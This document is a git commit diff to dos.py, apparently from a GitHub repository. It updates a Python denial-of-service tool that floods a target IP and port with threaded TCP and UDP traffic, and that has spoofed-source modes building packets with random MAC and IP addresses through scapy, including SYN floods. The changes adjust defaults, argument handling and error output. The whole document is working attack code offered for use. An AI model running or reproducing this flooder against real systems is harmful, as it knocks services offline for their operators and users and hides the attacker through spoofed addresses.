f52ee008bbd1f49218762a1194e050fbac9d03b6
Equat1on <139231131+3quat10n@users.noreply.github.com>
2025-07-02 15:42:24 +0200

    Update dos.py
    changes

--- dos.py
+++ dos.py
@@ -4,9 +4,11 @@ from scapy.all import *
 import argparse
 
 
+L=[]
+
 class Dos():
 
-    def __init__(self,ip,port,thread_s=500,flag="S",data="",size=1024):
+    def __init__(self,ip,port,thread_s,flag,data,size):
         self.ip = ip
         self.port = port
         self.thread_s = thread_s
@@ -19,30 +21,31 @@ class Dos():
         print(f"{'\033[31m'}[+]  Attack Started!!!")
 
     def err_handle(self,m):
-        print(f"{'\033[33m'}[-] {m}")
-        pass
-
+        if m not in L:
+            print(f"{'\033[33m'}[???] {m}")
+            L.append(m)
+    
     def connect_tcp(self):
 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         while 1:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
                 s.connect((self.ip,self.port))
                 s.send(self.data.encode())
-                s.close()
             except Exception as e:
-                self.err_handle(e)
+                self.err_handle(str(e))
+        s.close()
 
     def connect_udp(self):
 
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         while 1:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             try:
                 s.connect((self.ip,self.port))
                 s.sendto(self.data.encode(),((self.ip,self.port)))
-                s.close()
             except Exception as e:
-                self.err_handle(e)
+                self.err_handle(str(e))
+        s.close()
 
 
     def tcp_dos(self):
@@ -51,7 +54,7 @@ class Dos():
             t = threading.Thread(target=self.connect_tcp)
             t.start()
         
-        print(f"{'\033[92m'}[!!!] Threads has Been Ended11")
+        print(f"{'\033[92m'}[!!!] Threads has Been Ended")
 
     def udp_dos(self):
 
@@ -67,7 +70,7 @@ class Dos():
                 packet = Ether(src=str(RandMAC()))/IP(src=str(RandIP()),dst=self.ip,flags="DF")/TCP(sport=int(RandShort()),dport=self.port,flags=self.flag)/Raw(load=self.data)
                 sendp(packet,verbose=0)
             except Exception as e:
-                self.err_handle(e)
+                self.err_handle(str(e))
 
 
     def spoof_connect_udp(self):
@@ -76,7 +79,7 @@ class Dos():
                 packet = Ether(src=str(RandMAC()))/IP(src=str(RandIP()),dst=self.ip,flags="DF")/UDP(sport=int(RandShort()),dport=self.port)/Raw(load=self.data)
                 sendp(packet,verbose=0)
             except Exception as e:
-                self.err_handle(e)
+                self.err_handle(str(e))
 
 
     def Stcp_dos(self):
@@ -98,24 +101,24 @@ class Dos():
 def main():
     parser = argparse.ArgumentParser()    
     parser.add_argument("-ip", help="Target IP", type=str)
-    parser.add_argument("-p", help="Target Port", type=int,)
-    parser.add_argument("-t", help="Number Of Threads", type=int,default=500)
+    parser.add_argument("-p", help="Target Port", type=int,default=80)
+    parser.add_argument("-t", help="Number Of Threads", type=int,default=50)
     parser.add_argument("-protocol", help="Protocol TCP or UDP?", type=str)
-    parser.add_argument("-spoof", help="-spoof 1 For Spoof Attack", type=bool, default=0)
+    parser.add_argument("-spoof", help="-spoof 1 For Spoof Attack",dest="spoof",action='store_true')
     parser.add_argument("-flag", help="Flags S,SA,R,F...", type=str, default="S")
-    parser.add_argument("-data", help="Raw Load", type=str, default="A")
-    parser.add_argument("-size", help="Data *SIZE", type=int, default=1024)
+    parser.add_argument("-data", help="Raw Load", type=str, default="X")
+    parser.add_argument("-size", help="Data *SIZE", type=int,default=50)
     parser.parse_args()
     args = parser.parse_args()
 
 
-    if args.protocol == "TCP" and args.spoof == 0:
+    if args.protocol == "TCP" and args.spoof == 0 and args.flag == "S":
         Dos(ip=args.ip,port=args.p,thread_s=args.t,flag=args.flag,data=args.data,size=args.size).tcp_dos()
 
-    elif args.protocol == "UDP" and args.spoof == 0:
+    elif args.protocol == "UDP" and args.spoof == 0 and args.flag == "S":
         Dos(ip=args.ip,port=args.p,thread_s=args.t,flag=args.flag,data=args.data,size=args.size).udp_dos()
 
-    elif args.protocol == "TCP" and args.spoof == 1:
+    elif args.protocol == "TCP" and (args.spoof == 1 or args.flag != "S"):
         Dos(ip=args.ip,port=args.p,thread_s=args.t,flag=args.flag,data=args.data,size=args.size).Stcp_dos()
 
     elif args.protocol == "UDP" and args.spoof == 1:
@@ -123,7 +126,6 @@ def main():
     else:
         print("[-]python3 dos.py -h")
 
-try:
-    main()
-except Exception as e:
-    print(f"[-] {e}")
+
+
+main()
